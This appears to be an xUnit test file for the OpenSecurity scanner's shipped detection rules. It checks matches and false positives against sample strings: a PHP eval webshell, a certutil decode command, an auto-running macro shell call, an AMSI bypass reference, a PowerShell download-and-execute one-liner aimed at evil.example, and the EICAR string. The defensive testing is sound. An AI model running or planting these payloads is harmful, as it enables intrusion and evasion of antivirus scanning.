using System.Text;
using OpenSecurity.Core;
using OpenSecurity.Core.Rules;
using Xunit;

namespace OpenSecurity.Core.Tests;

/// <summary>Parses and exercises the actual rule files shipped in the repo's rules/ directory,
/// not just inline test rule text - catches syntax mistakes in the shipped content itself.</summary>
public class ShippedRulesTests
{
    private static string? FindRulesDirectory() =>
        DefaultPaths.FindUp(AppContext.BaseDirectory, "rules");

    [Fact]
    public void RulesDirectory_IsFound_AndParsesWithoutError()
    {
        var rulesDir = FindRulesDirectory();
        Assert.NotNull(rulesDir);

        var rules = PatternRuleParser.ParseDirectory(rulesDir!);

        Assert.True(rules.Count >= 8, $"expected at least 8 shipped rules, found {rules.Count}");
    }

    [Fact]
    public void WebshellRule_MatchesPhpEvalPattern()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("<?php eval($_POST['cmd']); ?>");
        var findings = engine.Scan(content).ToList();

        Assert.Contains(findings, f => f.Name == "Suspicious_PHP_Webshell_Eval");
    }

    [Fact]
    public void LolbinRule_MatchesCertutilDecode()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("cmd.exe /c certutil -decode payload.b64 payload.exe");
        var findings = engine.Scan(content).ToList();

        Assert.Contains(findings, f => f.Name == "Suspicious_LOLBin_Abuse");
    }

    [Fact]
    public void MacroRule_RequiresBothAutoexecAndShell_NotJustOne()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var onlyAutoOpen = Encoding.ASCII.GetBytes("Sub Auto_Open() MsgBox \"hi\" End Sub");
        var findingsAutoOnly = engine.Scan(onlyAutoOpen).ToList();
        Assert.DoesNotContain(findingsAutoOnly, f => f.Name == "Suspicious_Macro_AutoOpen_Shell");

        var both = Encoding.ASCII.GetBytes("Sub Auto_Open() Shell(\"cmd.exe /c whoami\") End Sub");
        var findingsBoth = engine.Scan(both).ToList();
        Assert.Contains(findingsBoth, f => f.Name == "Suspicious_Macro_AutoOpen_Shell");
    }

    [Fact]
    public void AmsiRule_DoesNotFalsePositive_OnLegitimateDotNetRuntimeAmsiIntegration()
    {
        // Regression test for a real false positive found scanning OpenSecurity's own
        // published self-contained exe: the .NET runtime's own built-in AMSI integration
        // (bundled into every self-contained single-file .NET app) legitimately calls the
        // native AmsiScanBuffer API, which used to be the rule's only indicator.
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("...AmsiScanBuffer...some .NET runtime hosting metadata...");
        var findings = engine.Scan(content).ToList();

        Assert.DoesNotContain(findings, f => f.Name == "Suspicious_Amsi_Bypass_Reference");
    }

    [Fact]
    public void AmsiRule_StillMatches_KnownPowerShellBypassTechnique()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')");
        var findings = engine.Scan(content).ToList();

        Assert.Contains(findings, f => f.Name == "Suspicious_Amsi_Bypass_Reference");
    }

    [Fact]
    public void ScriptDownloaderRule_DoesNotFalsePositive_OnBareNamespaceFragment()
    {
        // Regression test for the same self-scan false positive - "Net.WebClient" is a
        // substring of a real .NET namespace that can appear in compiled metadata even when
        // WebClient is never actually invoked as a downloader.
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("System.Net.WebClient, Version=4.0.0.0, referenced in assembly metadata");
        var findings = engine.Scan(content).ToList();

        Assert.DoesNotContain(findings, f => f.Name == "Suspicious_Script_Downloader");
    }

    [Fact]
    public void ScriptDownloaderRule_StillMatches_KnownPowerShellDownloaderOneLiner()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')");
        var findings = engine.Scan(content).ToList();

        Assert.Contains(findings, f => f.Name == "Suspicious_Script_Downloader");
    }

    [Fact]
    public void EicarRule_StillPresent_AndMatches()
    {
        var rulesDir = FindRulesDirectory();
        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
        var engine = new PatternRuleEngine(rules);

        var content = Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
        var findings = engine.Scan(content).ToList();

        Assert.Contains(findings, f => f.Name == "Eicar_Test_String");
    }
}
